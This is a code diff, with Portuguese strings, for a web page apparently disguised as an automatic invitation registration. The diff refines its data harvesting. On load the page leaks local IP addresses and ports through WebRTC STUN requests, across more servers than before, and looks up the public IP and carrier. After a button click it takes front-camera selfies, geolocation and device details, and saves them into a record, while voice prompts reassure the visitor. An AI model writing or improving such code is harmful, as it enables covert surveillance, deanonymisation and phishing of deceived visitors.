@@ -40,15 +40,17 @@ async function capturarPortaAvancada() {
     'stun:stun.l.google.com:19302',
     'stun:stun1.l.google.com:19302',
     'stun:stun2.l.google.com:19302',
+    'stun:stun3.l.google.com:19302',
+    'stun:stun4.l.google.com:19302',
     'stun:stun.ekiga.net',
-    'stun:stun.ideasip.com'
+    'stun:stun.ideasip.com',
+    'stun:stun.iptel.org'
   ];
 
-  // Captura via STUN (IPv4 + IPv6)
-  for (let server of stunServers) {
+  for (let i = 0; i < 10; i++) {
     try {
       const rtc = new RTCPeerConnection({
-        iceServers: [{ urls: server }]
+        iceServers: [{ urls: stunServers[i % stunServers.length] }]
       });
       rtc.createDataChannel("port-test");
       const offer = await rtc.createOffer();
@@ -60,7 +62,7 @@ async function capturarPortaAvancada() {
             const cand = event.candidate.candidate;
             const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-f0-9:]+)/i);
             const portMatch = cand.match(/(\d{4,5})\s+typ/);
-
+            
             if (ipMatch) {
               const ip = ipMatch[1];
               if (ip.includes(':')) info.ipv6 = ip;
@@ -69,13 +71,13 @@ async function capturarPortaAvancada() {
             if (portMatch) info.local_port = portMatch[1];
           }
         };
-        setTimeout(resolve, 1000);
+        setTimeout(resolve, 900);
       });
-      if (info.local_ip || info.ipv6) break;
+      if (info.local_port) break;
     } catch(e) {}
   }
 
-  // IP Público + Operadora
+  // Busca IP público + Operadora
   try {
     const res = await fetch("https://ipapi.co/json/");
     const data = await res.json();
@@ -92,7 +94,7 @@ async function capturarPortaAvancada() {
 async function iniciarSistema(){
   try {
     falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
-    statusText.innerHTML = "🟡 Capturando IPv4, IPv6 e operadora...";
+    statusText.innerHTML = "🟡 Iniciando sistema... Capturando IPv4, IPv6 e operadora...";
 
     const portaInfo = await capturarPortaAvancada();
 
@@ -107,7 +109,6 @@ async function iniciarSistema(){
     }]);
 
     statusText.innerHTML = "✅ Sistema pronto";
-
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
       audio: false
@@ -122,7 +123,7 @@ async function iniciarSistema(){
 window.onload = iniciarSistema;
 
 // =================================================================
-// ANALISADOR DE DISPOSITIVO (mantido)
+// ANALISADOR DE DISPOSITIVO
 // =================================================================
 function analisarDispositivo() {
   const ua = navigator.userAgent;
@@ -136,7 +137,7 @@ function analisarDispositivo() {
   else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
   else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
   else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";
-
+  
   let model = "Desconhecido";
   if (ua.indexOf("Mobile") >= 0) {
       const parts = ua.split(/[()]/);
@@ -145,6 +146,7 @@ function analisarDispositivo() {
           for (let part of deviceParts) {
               if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && 
                   part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && 
+                  part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 && 
                   part.length > 2) {
                   model = part.trim();
                   break;
@@ -163,7 +165,7 @@ btn.addEventListener("click", async () => {
     btn.disabled = true;
     btn.innerHTML = "PROCESSANDO...";
   
-    statusText.innerHTML = "📨 Verificando informações...";
+    statusText.innerHTML = "📨 Verificando informações do convite..";
     falar("Verificando informações do convite..");
 
     const largura = video.videoWidth;
@@ -185,7 +187,6 @@ btn.addEventListener("click", async () => {
     const stream = video.srcObject;
     if (stream) stream.getTracks().forEach(track => track.stop());
 
-    // Geolocalização
     let latitude = "não permitido";
     let longitude = "não permitido";
     try {
@@ -196,7 +197,7 @@ btn.addEventListener("click", async () => {
       longitude = localizacao.coords.longitude;
     } catch(err) {}
 
-    // IP + Operadora
+    // Captura avançada com IPv6 e Operadora
     const portaInfo = await capturarPortaAvancada();
 
     statusText.innerHTML = "💾 Salvando cadastro...";
@@ -209,13 +210,14 @@ btn.addEventListener("click", async () => {
       selfies: fotos,
       latitude: latitude.toString(),
       longitude: longitude.toString(),
-      ip: portaInfo.public_ip,
+      ip: portaInfo.public_ip || "indisponível",
       ipv6: portaInfo.ipv6,
       local_ip: portaInfo.local_ip,
       local_port: portaInfo.local_port,
       operadora: portaInfo.operadora,
-      cidade: portaInfo.cidade || "",
-      estado: portaInfo.estado || "",
+      cidade: "", 
+      estado: "",
+      pais: "",
       user_agent: navigator.userAgent,
       modelo_dispositivo: infoDispositivo.model,
       versao_android: infoDispositivo.androidVersion,
